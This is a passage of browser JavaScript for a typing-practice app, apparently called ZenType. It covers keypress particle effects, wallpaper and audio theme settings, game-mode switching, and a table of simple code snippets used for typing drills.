            const fireColors = ['#ff4500', '#ff8c00', '#ffd700', '#ff0000'];
            pColor = fireColors[Math.floor(Math.random() * fireColors.length)];
        } else if (shape === 'snow') {
            speed = 0.5 + Math.random();
            vx = 0; // Gentle sway handled directly in physics loop
            vy = speed; // Fall down gently
            gravity = 0.02;
            size = 1.5 + Math.random() * 2.5;
            decay = 0.01 + Math.random() * 0.015; // Lasts longer
            pColor = '#ffffff'; // Always crisp white snow
        } else if (shape === 'binary') {
            speed = 1 + Math.random() * 3;
            vx = (Math.random() - 0.5) * 1.5;
            vy = (Math.random() - 0.5) * 1.5 - 1; // Float up slightly at first
            gravity = 0.05; // Then tumble down
            size = 3 + Math.random() * 4;
            decay = 0.02 + Math.random() * 0.03;
            pColor = '#00ff41'; // Matrix green
            char = Math.random() > 0.5 ? '1' : '0';
        } else if (shape === 'rings') {
            speed = 0;
            vx = 0; vy = 0; // Stationary
            size = 1; // Starts tiny, expands in canvas drawing loop
            decay = 0.03 + Math.random() * 0.04;
            gravity = 0;
        } else if (shape === 'triangles') {
            speed = 4 + Math.random() * 6;
            vx = Math.cos(angle) * speed;
            vy = Math.sin(angle) * speed;
            size = 3 + Math.random() * 4;
            gravity = 0.1; // Projectile arc trajectory
            decay = 0.02 + Math.random() * 0.03;
        } else if (shape === 'hexagons') {
            speed = 2 + Math.random() * 3;
            vx = Math.cos(angle) * speed;
            vy = Math.sin(angle) * speed;
            size = 4 + Math.random() * 3;
            gravity = 0.05;
            decay = 0.02 + Math.random() * 0.02;
        } else if (shape === 'crescents') {
            speed = 1 + Math.random() * 2;
            vx = Math.cos(angle) * speed * 0.5 + 0.5; // Drift right slightly
            vy = -0.5 - Math.random() * 1.5; // Float up
            size = 4 + Math.random() * 4;
            gravity = 0;
            decay = 0.015 + Math.random() * 0.01; // Last longer
            pColor = '#f0e68c'; // Pale moon yellow
        } else if (shape === 'droplets') {
            speed = 1 + Math.random() * 2;
            vx = (Math.random() - 0.5) * 1;
            vy = -2 - Math.random() * 3; // Initial splash upwards
            size = 2 + Math.random() * 2;
            gravity = 0.2; // Heavy gravity so they fall fast
            decay = 0.02 + Math.random() * 0.02;
            pColor = '#00bfff'; // Deep sky blue
        } else if (shape === 'crosses') {
            speed = 2 + Math.random() * 5;
            vx = Math.cos(angle) * speed;
            vy = Math.sin(angle) * speed;
            size = 3 + Math.random() * 3;
            gravity = 0.05;
            decay = 0.02 + Math.random() * 0.03;
        } else if (shape === 'lines') {
            speed = 6 + Math.random() * 8; // Very fast
            vx = Math.cos(angle) * speed;
            vy = Math.sin(angle) * speed;
            size = 1; // Size doesn't matter much for lines, velocity determines length
            gravity = 0.1;
            decay = 0.05 + Math.random() * 0.05; // Fade fast
        } else if (shape === 'leaves') {
            speed = 1 + Math.random() * 2;
            vx = (Math.random() - 0.5) * 2;
            vy = 1 + Math.random() * 2; // fall down gently
            size = 3 + Math.random() * 3;
            gravity = 0.02;
            decay = 0.01 + Math.random() * 0.01;
            const leafColors = ['#228b22', '#32cd32', '#ff8c00', '#ffd700'];
            pColor = leafColors[Math.floor(Math.random() * leafColors.length)];
        } else if (shape === 'runes') {
            speed = 1 + Math.random() * 2;
            vx = (Math.random() - 0.5) * 1.5;
            vy = -1 - Math.random() * 2;
            gravity = -0.02; // float up slowly
            size = 2 + Math.random() * 3;
            decay = 0.015 + Math.random() * 0.02;
            const runes = ['ᚠ', 'ᚢ', 'ᚦ', 'ᚨ', 'ᚱ', 'ᚲ', 'ᚷ', 'ᚹ', 'ᚺ', 'ᚾ', 'ᛁ', 'ᛃ', 'ᛇ', 'ᛈ', 'ᛉ', 'ᛊ', 'ᛏ', 'ᛒ', 'ᛖ', 'ᛗ', 'ᛚ', 'ᛜ', 'ᛟ', 'ᛞ'];
            char = runes[Math.floor(Math.random() * runes.length)];
            pColor = '#ffaa00'; // glowing magic gold/orange
        } else if (shape === 'notes') {
            speed = 2 + Math.random() * 3;
            vx = Math.cos(angle) * speed;
            vy = Math.sin(angle) * speed - 2;
            gravity = 0.05;
            size = 3 + Math.random() * 4;
            decay = 0.02 + Math.random() * 0.02;
            const notes = ['♩', '♪', '♫', '♬', '♭', '♮', '♯'];
            char = notes[Math.floor(Math.random() * notes.length)];
        } else if (shape === 'sparks') {
            speed = 4 + Math.random() * 8;
            vx = Math.cos(angle) * speed;
            vy = Math.sin(angle) * speed - 3;
            size = 1.5 + Math.random() * 1.5;
            gravity = 0.4; // Very heavy
            decay = 0.03 + Math.random() * 0.04;
            pColor = '#ffe600'; // bright welding yellow
        } else if (shape === 'comets') {
            speed = 5 + Math.random() * 7;
            vx = Math.cos(angle) * speed;
            vy = Math.sin(angle) * speed;
            size = 2 + Math.random() * 3;
            gravity = 0.1;
            decay = 0.02 + Math.random() * 0.03;
            pColor = '#00ffff'; // cyan comets
        } else if (shape === 'polygons') {
            speed = 2 + Math.random() * 4;
            vx = Math.cos(angle) * speed;
            vy = Math.sin(angle) * speed;
            size = 3 + Math.random() * 4;
            gravity = 0.05;
            decay = 0.02 + Math.random() * 0.02;
            sides = 3 + Math.floor(Math.random() * 4); // 3 to 6 sides
        } else if (shape === 'dust') {
            speed = 0.2 + Math.random() * 0.8;
            vx = (Math.random() - 0.5) * speed;
            vy = (Math.random() - 0.5) * speed;
            size = 0.5 + Math.random() * 1.5;
            gravity = 0;
            decay = 0.005 + Math.random() * 0.01; // Lives very long
            pColor = '#e0e0e0';
        } else if (shape === 'ghosts') {
            speed = 0.5 + Math.random() * 1.5;
            vx = (Math.random() - 0.5) * 1;
            vy = -1 - Math.random() * 2; // Float up
            size = 4 + Math.random() * 6;
            gravity = -0.01; // Negative gravity
            decay = 0.01 + Math.random() * 0.015;
            pColor = '#d0f0ff'; // Ethereal pale blue
        } else if (shape === 'petals') {
            speed = 1 + Math.random() * 2;
            vx = (Math.random() - 0.5) * 2;
            vy = 1 + Math.random() * 2; // Drift down
            size = 2.5 + Math.random() * 3.5;
            gravity = 0.01;
            decay = 0.01 + Math.random() * 0.01;
            const petalColors = ['#ffb7c5', '#ffc0cb', '#ff69b4', '#ff1493'];
            pColor = petalColors[Math.floor(Math.random() * petalColors.length)];
        } else if (shape === 'bokeh') {
            speed = 0.2 + Math.random() * 1;
            vx = (Math.random() - 0.5) * speed;
            vy = (Math.random() - 0.5) * speed;
            size = 6 + Math.random() * 10; // Large
            gravity = 0;
            decay = 0.01 + Math.random() * 0.02;
        } else if (shape === 'gems') {
            speed = 2 + Math.random() * 3;
            vx = Math.cos(angle) * speed;
            vy = Math.sin(angle) * speed;
            size = 3 + Math.random() * 4;
            gravity = 0.05;
            decay = 0.02 + Math.random() * 0.02;
            const gemColors = ['#ff00ff', '#00ffff', '#ff00aa', '#00aaff'];
            pColor = gemColors[Math.floor(Math.random() * gemColors.length)];
        } else if (shape === 'orbs') {
            speed = 0.5 + Math.random();
            vx = (Math.random() - 0.5) * speed;
            vy = -0.5 - Math.random() * 1;
            size = 10 + Math.random() * 15; // Very large, soft
            gravity = -0.01;
            decay = 0.01 + Math.random() * 0.02;
            const orbColors = ['#ff6600', '#00ffaa', '#ee00ff', '#00aaff'];
            pColor = orbColors[Math.floor(Math.random() * orbColors.length)];
        } else if (shape === 'swirls') {
            speed = 1 + Math.random() * 3;
            vx = Math.cos(angle) * speed;
            vy = Math.sin(angle) * speed;
            size = 2 + Math.random() * 3;
            gravity = 0.02;
            decay = 0.015 + Math.random() * 0.02;
        } else if (shape === 'lightning') {
            speed = 0;
            vx = 0;
            vy = 0;
            size = 5 + Math.random() * 10;
            gravity = 0;
            decay = 0.05 + Math.random() * 0.05; // Quick flash
            pColor = '#e0f0ff';
        } else if (shape === 'pixels') {
            speed = 3 + Math.random() * 5;
            vx = Math.cos(angle) * speed;
            vy = Math.sin(angle) * speed;
            size = 2 + Math.random() * 4;
            gravity = 0.1;
            decay = 0.02 + Math.random() * 0.03;
            pColor = '#00ff00'; // Retro CRT green
        } else if (shape === 'skulls') {
            speed = 1 + Math.random() * 3;
            vx = Math.cos(angle) * speed;
            vy = Math.sin(angle) * speed - 1;
            size = 3 + Math.random() * 3;
            gravity = -0.05; // Souls float up
            decay = 0.015 + Math.random() * 0.02;
            pColor = '#aaaaaa'; // Bone gray
        } else if (shape === 'diamonds') {
            speed = 3 + Math.random() * 5;
            vx = Math.cos(angle) * speed;
            vy = Math.sin(angle) * speed;
            size = 3 + Math.random() * 4;
            gravity = 0.1;
            decay = 0.02 + Math.random() * 0.03;
            pColor = '#4488ff'; // Sapphire blue
        } else if (shape === 'waves') {
            speed = 2 + Math.random() * 4;
            vx = Math.cos(angle) * speed;
            vy = Math.sin(angle) * speed;
            size = 2 + Math.random() * 2;
            gravity = 0.05;
            decay = 0.02 + Math.random() * 0.02;
            pColor = '#00ddff'; // Wave water blue
        } else if (shape === 'pulse') {
            speed = 0.5 + Math.random() * 2;
            vx = Math.cos(angle) * speed;
            vy = Math.sin(angle) * speed;
            size = 4 + Math.random() * 3;
            gravity = 0;
            decay = 0.01 + Math.random() * 0.01;
            pColor = '#ff3333'; // Thumping red heart
        } else if (shape === 'confetti') {
            speed = 2 + Math.random() * 6;
            vx = (Math.random() - 0.5) * speed;
            vy = -3 - Math.random() * 5; // Pop upwards!
            size = 2 + Math.random() * 3;
            gravity = 0.15; // float down like paper
            decay = 0.01 + Math.random() * 0.02;
            const confColors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff'];
            pColor = confColors[Math.floor(Math.random() * confColors.length)];
        }

        keyParticles.push({
            x: x,
            y: y,
            vx: vx,
            vy: vy,
            life: life,
            decay: decay,
            size: size,
            baseSize: size, // Save base size for pulsing
            color: pColor,
            gravity: gravity,
            shape: shape,
            char: char,
            sides: sides // Capture sides if defined
        });
    }
    // Restart the render loop if it was idle
    if (!keypressAnimId) {
        keypressAnimId = requestAnimationFrame(loopKeypressParticles);
    }
}

function spawnHagakureParticles(x, y) {
    if (!userConfig.particle) return;

    // 1. Blood Spray
    const bloodCount = 8 + Math.random() * 8;
    for (let i = 0; i < bloodCount; i++) {
        const angle = (Math.random() * Math.PI) + Math.PI; // Upward-ish arc
        const speed = 2 + Math.random() * 5;
        keyParticles.push({
            x: x,
            y: y,
            vx: Math.cos(angle) * speed,
            vy: Math.sin(angle) * speed - 1,
            life: 1.0,
            decay: 0.015 + Math.random() * 0.025,
            size: 1.5 + Math.random() * 2.5,
            color: '#ce1126',
            gravity: 0.18
        });
    }

    // 2. Steel Sparks
    const sparkCount = 4 + Math.random() * 4;
    for (let i = 0; i < sparkCount; i++) {
        const angle = Math.random() * Math.PI * 2;
        const speed = 4 + Math.random() * 6;
        keyParticles.push({
            x: x,
            y: y,
            vx: Math.cos(angle) * speed,
            vy: Math.sin(angle) * speed,
            life: 0.8,
            decay: 0.05 + Math.random() * 0.1,
            size: 1 + Math.random() * 1.5,
            color: '#ffffff',
            gravity: 0.05
        });
    }
    // Restart the render loop if it was idle
    if (!keypressAnimId) {
        keypressAnimId = requestAnimationFrame(loopKeypressParticles);
    }
}


// --- 4. THEME MANAGER ---

function initTheme() {
    const savedConfig = localStorage.getItem('zenTypeConfig');
    if (savedConfig) {
        userConfig = { ...userConfig, ...JSON.parse(savedConfig) };
        // Ensure wallpaperAudio is present (migration)
        if (userConfig.wallpaperAudio === undefined) userConfig.wallpaperAudio = true;
    }

    // Restore sound preference
    const savedSound = localStorage.getItem('zenTypeSoundEnabled');
    if (savedSound !== null) {
        soundEnabled = savedSound === 'true';
        if (!soundEnabled) {
            const icon = UI.soundBtn.querySelector('i');
            icon.className = 'ri-volume-mute-line text-xl';
            UI.soundBtn.classList.add('muted');
        }
    }

    renderWallpaperGrid();
    setupSettingsListeners();
    applyTheme();

    // Sync effect UI
    document.querySelectorAll('.effect-btn').forEach(btn => btn.classList.toggle('active', btn.dataset.effect === userConfig.effectType));
    document.querySelectorAll('.color-dot').forEach(dot => dot.classList.toggle('active', dot.dataset.color === userConfig.effectColor));
    document.getElementById('custom-color-picker').value = userConfig.effectColor;
    document.getElementById('intensity-slider').value = userConfig.effectIntensity;
    document.getElementById('intensity-value').innerText = userConfig.effectIntensity + '%';

    // Sync sound UI
    document.querySelectorAll('.sound-btn').forEach(btn => btn.classList.toggle('active', btn.dataset.sound === userConfig.soundProfile));
    document.getElementById('volume-slider').value = userConfig.soundVolume;
    document.getElementById('volume-value').innerText = userConfig.soundVolume + '%';

    // Sync music volume UI
    const bgVol = userConfig.bgVolume !== undefined ? userConfig.bgVolume : 50;
    document.getElementById('bg-volume-slider').value = bgVol;
    document.getElementById('bg-volume-value').innerText = bgVol + '%';

    // Apply Caret Style
    document.body.dataset.caret = userConfig.caretStyle || 'line';
    document.querySelectorAll('.caret-btn').forEach(btn =>
        btn.classList.toggle('active', btn.dataset.caret === (userConfig.caretStyle || 'line'))
    );

    // Apply Font
    const font = userConfig.fontFamily || 'modern';
    document.documentElement.style.setProperty('--font-main', `var(--font-${font})`);
    document.querySelectorAll('.font-btn').forEach(btn =>
        btn.classList.toggle('active', btn.dataset.font === font)
    );

    // Apply Particle Shape Toggle UI
    const shape = userConfig.particleShape || 'default';
    document.querySelectorAll('.shape-btn').forEach(btn =>
        btn.classList.toggle('active', btn.dataset.particleShape === shape)
    );
}

function toggleZenMode(forceState = null) {
    const isZen = forceState !== null ? forceState : !document.body.classList.contains('zen-mode');

    if (isZen) {
        document.body.classList.add('zen-mode');
        // If UI.zenBtn exists, update icon? (Optional)
    } else {
        document.body.classList.remove('zen-mode');
    }
    userConfig.zenMode = isZen;
    saveConfig();
}

function applyTheme(skipLoader = false) {
    const wp = wallpapers.find(w => w.id === userConfig.wallpaperId) || wallpapers[0];

    // --- AUDIO TOGGLE UI ---
    if (UI.wallpaperSoundBtn) {
        if (wp.hasAudio) {
            UI.wallpaperSoundBtn.classList.remove('hidden');
            const icon = UI.wallpaperSoundBtn.querySelector('i');
            if (userConfig.wallpaperAudio) {
                icon.className = 'ri-volume-up-line text-xl';
                UI.wallpaperSoundBtn.classList.remove('muted');
            } else {
                icon.className = 'ri-volume-mute-line text-xl';
                UI.wallpaperSoundBtn.classList.add('muted');
            }
        } else {
            UI.wallpaperSoundBtn.classList.add('hidden');
        }
    }

    // --- AUDIO CLASH PREVENTION & LINKED TRACKS ---
    // If wallpaper has audio enabled, we stop music. 
    // If it's disabled, we allow music.

    if (wp.linkedTrackUrl) {
        // Find the track in masterPlaylist
        const trackIndex = masterPlaylist.findIndex(t => t.url === wp.linkedTrackUrl);
        if (trackIndex !== -1) {
            playSpecificMasterTrack(trackIndex);
        }
    }
    // Decoupled: Removed logic that stops master music if wallpaper has audio.
    // They can now play simultaneously.

    // --- HANDLE AUDIO (Master vs Specific) ---
    // Since we removed local audio files, we only check for Soundboard (SC) or Video Audio.
    // Master Audio (Local) Logic Removed.

    // 2. Handle Specific Audio File (No longer used, removed audioUrl)
    if (currentBgAudio) {
        currentBgAudio.pause();
        currentBgAudio = null;
    }

    if (!skipLoader) UI.loadingOverlay.classList.remove('hidden');

    if (wp.isVideo) {
        UI.bgVideo.classList.add('fade-out');
        UI.bgVideo.oncanplay = null;
        UI.bgVideo.onerror = null;

        // Always start muted to ensure autoplay works visually
        UI.bgVideo.muted = true;
        UI.bgVideo.volume = (userConfig.bgVolume !== undefined ? userConfig.bgVolume : 50) / 100;
        UI.bgVideo.src = wp.url;
        UI.bgVideo.load();

        UI.bgVideo.oncanplay = () => {
            UI.bgVideo.oncanplay = null;
            // Attempt to play immediately (should succeed since muted)
            const playPromise = UI.bgVideo.play();

            if (playPromise !== undefined) {
                playPromise.then(() => {
                    UI.bgVideo.classList.remove('fade-out');
                    document.body.style.backgroundImage = 'none';
                    if (!skipLoader) UI.loadingOverlay.classList.add('hidden');

                    // If video has audio, unmute on first interaction
                    // If video has audio, unmute on first interaction if enabled
                    if (wp.hasAudio) {
                        const enableAudio = () => {
                            if (soundEnabled && userConfig.wallpaperAudio) UI.bgVideo.muted = false;
                            else UI.bgVideo.muted = true; // Ensure muted if disabled

                            document.removeEventListener('click', enableAudio);
                            document.removeEventListener('keydown', enableAudio);
                        };

                        // If we are re-applying (skipLoader=true), we might already have interacted
                        if (skipLoader && userConfig.wallpaperAudio) {
                            UI.bgVideo.muted = false;
                        } else if (skipLoader && !userConfig.wallpaperAudio) {
                            UI.bgVideo.muted = true;
                        } else {
                            document.addEventListener('click', enableAudio);
                            document.addEventListener('keydown', enableAudio);
                        }
                    }
                }).catch(error => {
                    console.log("Autoplay failed:", error);
                    // Fallback: wait for interaction
                    const forcePlay = () => {
                        UI.bgVideo.play();
                        UI.bgVideo.classList.remove('fade-out');
                        document.body.style.backgroundImage = 'none';
                    };
                    document.addEventListener('click', forcePlay, { once: true });
                    document.addEventListener('keydown', forcePlay, { once: true });
                    if (!skipLoader) UI.loadingOverlay.classList.add('hidden');
                });
            }
        };

        UI.bgVideo.onerror = () => {
            console.error('Video failed to load:', wp.url);
            const fallback = wallpapers.find(w => !w.isVideo);
            if (fallback) document.body.style.backgroundImage = `url('${fallback.url}')`;
            if (!skipLoader) UI.loadingOverlay.classList.add('hidden');
        };
    } else {
        UI.bgVideo.classList.add('fade-out');
        UI.bgVideo.muted = true;
        setTimeout(() => UI.bgVideo.pause(), 500);

        const img = new Image();
        img.src = wp.url;
        img.onload = () => {
            document.body.style.backgroundImage = `url('${wp.url}')`;
            if (!skipLoader) UI.loadingOverlay.classList.add('hidden');
        };
    }

    setTimeout(() => {
        if (!skipLoader && !UI.loadingOverlay.classList.contains('hidden')) {
            UI.loadingOverlay.classList.add('hidden');
        }
    }, 5000);

    document.documentElement.style.setProperty('--panel-opacity', userConfig.opacity / 100);
    UI.opacitySlider.value = userConfig.opacity;
    UI.opacityValue.innerText = userConfig.opacity + '%';

    let rgb = '20, 20, 30';
    if (userConfig.tint === 'light') rgb = '255, 255, 255';
    if (userConfig.tint === 'glass') rgb = '100, 100, 100';
    if (userConfig.tint === 'midnight') rgb = '10, 10, 46';
    if (userConfig.tint === 'warm') rgb = '42, 26, 10';
    if (userConfig.tint === 'transparent') rgb = '0, 0, 0';
    document.documentElement.style.setProperty('--panel-bg', rgb);

    // Handle transparent tint — override opacity to 0, remove border/shadow
    const glassPanel = document.querySelector('.glass-panel');
    if (userConfig.tint === 'transparent') {
        document.documentElement.style.setProperty('--panel-opacity', '0');
        if (glassPanel) {
            glassPanel.style.border = 'none';
            glassPanel.style.boxShadow = 'none';
            glassPanel.style.backdropFilter = 'none';
            glassPanel.style.webkitBackdropFilter = 'none';
        }
    } else {
        if (glassPanel) {
            glassPanel.style.border = '';
            glassPanel.style.boxShadow = '';
            glassPanel.style.backdropFilter = '';
            glassPanel.style.webkitBackdropFilter = '';
        }
    }

    if (userConfig.tint === 'light') {
        document.documentElement.style.setProperty('--text-main', '#1a1a1a');
        document.documentElement.style.setProperty('--text-muted', 'rgba(0,0,0,0.5)');
    } else {
        document.documentElement.style.setProperty('--text-main', 'rgba(255, 255, 255, 0.9)');
        document.documentElement.style.setProperty('--text-muted', 'rgba(255, 255, 255, 0.4)');
    }

    document.querySelectorAll('.tint-btn').forEach(btn => btn.classList.toggle('active', btn.dataset.tint === userConfig.tint));
    document.querySelectorAll('.wallpaper-thumb').forEach(thumb => thumb.classList.toggle('active', thumb.dataset.id === userConfig.wallpaperId));

    document.querySelectorAll('.wallpaper-thumb').forEach(thumb => thumb.classList.toggle('active', thumb.dataset.id === userConfig.wallpaperId));

    // Apply Caret Style
    document.body.dataset.caret = userConfig.caretStyle || 'line';
    document.documentElement.style.setProperty('--caret-color', userConfig.caretColor || '#ffd700');
    document.querySelectorAll('.caret-btn').forEach(btn =>
        btn.classList.toggle('active', btn.dataset.caret === (userConfig.caretStyle || 'line'))
    );

    // Sync Caret Color UI
    document.querySelectorAll('.caret-color-dot').forEach(btn => {
        btn.classList.toggle('active', btn.dataset.caretColor === (userConfig.caretColor || '#ffd700'));
    });
    const caretPicker = document.getElementById('caret-custom-color');
    if (caretPicker) caretPicker.value = userConfig.caretColor || '#ffd700';

    // Apply Font
    const font = userConfig.fontFamily || 'modern';
    document.documentElement.style.setProperty('--font-main', `var(--font-${font})`);
    document.querySelectorAll('.font-btn').forEach(btn =>
        btn.classList.toggle('active', btn.dataset.font === font)
    );

    // Particle UI
    const pToggle = document.getElementById('particle-toggle');
    if (pToggle) pToggle.checked = userConfig.particle !== false;

    document.querySelectorAll('.color-btn').forEach(btn => {
        const colorMap = { gold: '#ffd700', cyan: '#00d4ff', magenta: '#ff00ff', white: '#ffffff' };
        const hex = colorMap[btn.dataset.color] || btn.dataset.color;
        btn.classList.toggle('active', hex === (userConfig.particleColor || '#ffd700'));
    });

    saveConfig();
}

function renderWallpaperGrid() {
    // --- Render category tabs ---
    const tabsContainer = document.getElementById('wallpaper-tabs');
    tabsContainer.innerHTML = wallpaperCategories.map(cat => {
        const count = wallpapers.filter(w => w.category === cat.id || (w.categories && w.categories.includes(cat.id))).length;
        return `<button class="category-tab ${cat.id === currentCategory ? 'active' : ''}" data-category="${cat.id}">
            <i class="${cat.icon}"></i>
            <span>${cat.label}</span>
            <span class="tab-count">${count}</span>
        </button>`;
    }).join('');

    // --- Tab click handler ---
    tabsContainer.addEventListener('click', (e) => {
        const tab = e.target.closest('.category-tab');
        if (!tab) return;
        currentCategory = tab.dataset.category;
        renderWallpaperGrid();
    });

    // --- Render filtered wallpaper thumbnails ---
    const filtered = wallpapers.filter(w => w.category === currentCategory || (w.categories && w.categories.includes(currentCategory)));

    if (filtered.length === 0) {
        UI.wallpaperGrid.innerHTML = `
            <div class="empty-category">
                <i class="ri-add-circle-line"></i>
                <span>No wallpapers yet</span>
                <span class="empty-hint">Add items to this category in script.js</span>
            </div>`;
    } else {
        UI.wallpaperGrid.innerHTML = filtered.map(wp =>
            `<div class="wallpaper-thumb ${wp.id === userConfig.wallpaperId ? 'active' : ''}" 
                  style="background-image: url('${wp.thumb}')" 
                  data-id="${wp.id}"
                  title="${wp.id}">
                  ${wp.isVideo ? '<i class="ri-movie-fill text-white absolute bottom-1 right-1 text-xs drop-shadow-md"></i>' : ''}
            </div>`
        ).join('');
    }
}


function setupSettingsListeners() {
    UI.settingsBtn.addEventListener('click', () => UI.settingsModal.classList.remove('hidden'));
    UI.closeSettingsBtn.addEventListener('click', () => {
        UI.settingsModal.classList.add('hidden');
        UI.input.focus();
    });

    // Style selection removed (integrated into wallpaper grid)

    // Settings tab switching
    document.querySelectorAll('.settings-tab').forEach(tab => {
        tab.addEventListener('click', () => {
            document.querySelectorAll('.settings-tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
            tab.classList.add('active');
            document.getElementById(`tab-${tab.dataset.tab}`).classList.add('active');
        });
    });

    // --- MODES MODAL LOGIC ---
    const modesBtn = document.getElementById('modes-btn');
    const modesModal = document.getElementById('modes-modal');
    const closeModesBtn = document.getElementById('close-modes-btn');

    if (modesBtn && modesModal && closeModesBtn) {
        modesBtn.addEventListener('click', (e) => {
            e.preventDefault();
            modesModal.classList.remove('hidden');
        });

        closeModesBtn.addEventListener('click', () => {
            modesModal.classList.add('hidden');
        });

        modesModal.addEventListener('click', (e) => {
            if (e.target === modesModal) {
                modesModal.classList.add('hidden');
            }
        });

        // Hagakure Card Click
        const hagakureCard = document.querySelector('.mode-card.active'); // Assuming Hagakure is the only active one for now
        if (hagakureCard) {
            hagakureCard.addEventListener('click', () => {
                startHagakureMode();
                modesModal.classList.add('hidden');
            });
        }

        // Shadow Mode Card Click
        const shadowCard = document.getElementById('shadow-mode-card');
        if (shadowCard) {
            shadowCard.addEventListener('click', () => {
                startShadowMode();
                modesModal.classList.add('hidden');
            });
        }

        // Dojo Mode Card Click
        const dojoCard = document.getElementById('dojo-mode-card');
        if (dojoCard) {
            dojoCard.addEventListener('click', () => {
                startDojoMode();
                modesModal.classList.add('hidden');
            });
        }

        // Coding Mode Card Click
        const codingCard = document.getElementById('coding-mode-card');
        if (codingCard) {
            codingCard.addEventListener('click', () => {
                startCodingMode();
                modesModal.classList.add('hidden');
            });
        }

        // Zen Garden Mode Card Click
        const zenCard = document.getElementById('zen-mode-card');
        if (zenCard) {
            zenCard.addEventListener('click', () => {
                startZenMode();
                modesModal.classList.add('hidden');
            });
        }
    }

    // ═══════════════════════════════════════════════════════
    //                    ZEN GARDEN MODE
    //     "Type in stillness. Find your flow."
    // ═══════════════════════════════════════════════════════

    function startZenMode() {
        // Hide main UI elements
        ['game-ui', 'modes-modal'].forEach(id => {
            const el = document.getElementById(id);
            if (el) el.classList.add('hidden');
        });

        const appHeader = document.getElementById('app-header');
        const navButtons = document.getElementById('top-nav-buttons');
        const footer = document.querySelector('footer') || document.querySelector('.site-footer');

        if (appHeader) appHeader.style.display = 'none';
        if (navButtons) navButtons.style.display = 'none';
        if (footer) footer.style.display = 'none';

        // Mute background audio/video
        if (UI.bgVideo) UI.bgVideo.muted = true;

        // Show coding UI (which contains the zen board)
        const codingUI = document.getElementById('coding-ui');
        if (codingUI) codingUI.classList.remove('hidden');

        state.gameMode = 'zen';

        // Initialize coding mode UI if not already done
        if (!codingState._uiInitialized) {
            initCodingModeUI();
            codingState._uiInitialized = true;
        }

        // Jump straight to zen garden board
        launchZenGarden();
    }

    // ═══════════════════════════════════════════════════════
    //                    CODING MODE
    //     "Where syntax becomes second nature."
    // ═══════════════════════════════════════════════════════

    function startCodingMode() {
        const splash = document.getElementById('coding-splash');
        if (!splash) return;

        // Show splash
        splash.classList.remove('hidden');

        // Hide main UI elements
        ['game-ui', 'modes-modal'].forEach(id => {
            const el = document.getElementById(id);
            if (el) el.classList.add('hidden');
        });

        const appHeader = document.getElementById('app-header');
        const navButtons = document.getElementById('top-nav-buttons');
        const footer = document.querySelector('footer') || document.querySelector('.site-footer');

        if (appHeader) appHeader.style.display = 'none';
        if (navButtons) navButtons.style.display = 'none';
        if (footer) footer.style.display = 'none';

        // Mute background audio/video
        if (UI.bgVideo) UI.bgVideo.muted = true;

        // After splash animation, transition to coding UI
        setTimeout(() => {
            splash.classList.add('hidden');

            const codingUI = document.getElementById('coding-ui');
            if (codingUI) codingUI.classList.remove('hidden');

            state.gameMode = 'coding';

            // Initialize coding mode UI ONCE and show mode select
            if (!codingState._uiInitialized) {
                initCodingModeUI();
                codingState._uiInitialized = true;
            }
            showCodingScreen('coding-mode-select');

        }, 3500); // 3.5s to let the full animation play
    }

    function exitCodingMode() {
        // Clean up intervals
        if (codingState.timerInterval) { clearInterval(codingState.timerInterval); codingState.timerInterval = null; }
        if (codingState.wpmInterval) { clearInterval(codingState.wpmInterval); codingState.wpmInterval = null; }

        // Hide coding UI
        const codingUI = document.getElementById('coding-ui');
        if (codingUI) codingUI.classList.add('hidden');

        // Restore main UI
        const gameUI = document.getElementById('game-ui');
        const appHeader = document.getElementById('app-header');
        const navButtons = document.getElementById('top-nav-buttons');
        const footer = document.querySelector('footer') || document.querySelector('.site-footer');

        if (gameUI) gameUI.classList.remove('hidden');
        if (appHeader) appHeader.style.display = '';
        if (navButtons) navButtons.style.display = '';
        if (footer) footer.style.display = '';

        // Restore video audio state
        if (UI.bgVideo) {
            const wp = wallpapers.find(w => w.id === userConfig.wallpaperId);
            if (wp && wp.hasAudio && userConfig.wallpaperAudio) {
                UI.bgVideo.muted = false;
            }
        }

        state.gameMode = 'time';
        newGame();
    }

    // ── CODING MODE DATA ──
    const codingLanguages = [
        { id: 'python', name: 'Python', icon: '🐍' },
        { id: 'javascript', name: 'JavaScript', icon: '⚡' },
        { id: 'typescript', name: 'TypeScript', icon: '🔷' },
        { id: 'c', name: 'C', icon: '⚙️' },
        { id: 'cpp', name: 'C++', icon: '🔧' },
        { id: 'java', name: 'Java', icon: '☕' },
        { id: 'rust', name: 'Rust', icon: '🦀' },
        { id: 'go', name: 'Go', icon: '🐹' }
    ];

    const codingCategories = [
        { id: 'loops', name: 'Loops', icon: 'ri-loop-left-line' },
        { id: 'conditionals', name: 'Conditionals', icon: 'ri-git-branch-line' },
        { id: 'functions', name: 'Functions', icon: 'ri-code-box-line' },
        { id: 'data_structures', name: 'Data Structures', icon: 'ri-database-2-line' },
        { id: 'classes', name: 'Classes / OOP', icon: 'ri-stack-line' },
        { id: 'error_handling', name: 'Error Handling', icon: 'ri-bug-line' },
        { id: 'imports', name: 'Imports / Modules', icon: 'ri-download-2-line' }
    ];

    const codingSnippets = {
        python: {
            loops: [
                'for i in range(10):\n    print(i)',
                'for item in items:\n    process(item)',
                'while count > 0:\n    count -= 1',
                'for key, val in data.items():\n    print(key, val)',
                'for i, v in enumerate(lst):\n    print(i, v)',
                '[x * 2 for x in range(10)]'
            ],
            conditionals: [
                'if x > 0:\n    return "positive"',
                'if age >= 18:\n    status = "adult"\nelse:\n    status = "minor"',
                'result = "yes" if valid else "no"',
                'if x > 0:\n    print("pos")\nelif x < 0:\n    print("neg")\nelse:\n    print("zero")',
                'if name and len(name) > 0:\n    greet(name)'
            ],
            functions: [
                'def greet(name):\n    return f"Hello, {name}"',
                'def add(a, b=0):\n    return a + b',
                'lambda x: x * 2',
                'def factorial(n):\n    if n <= 1:\n        return 1\n    return n * factorial(n - 1)',
                'async def fetch(url):\n    response = await get(url)\n    return response.json()'
            ],
            data_structures: [
                'nums = [1, 2, 3, 4, 5]',
                'user = {"name": "zen", "wpm": 120}',
                'coords = (10, 20)',
                'unique = {1, 2, 3, 4}',
                'from collections import deque\nq = deque([1, 2, 3])'
            ],
            classes: [
                'class Player:\n    def __init__(self, name):\n        self.name = name',
                'class Admin(User):\n    def __init__(self):\n        super().__init__()',
                '@property\ndef score(self):\n    return self._score',
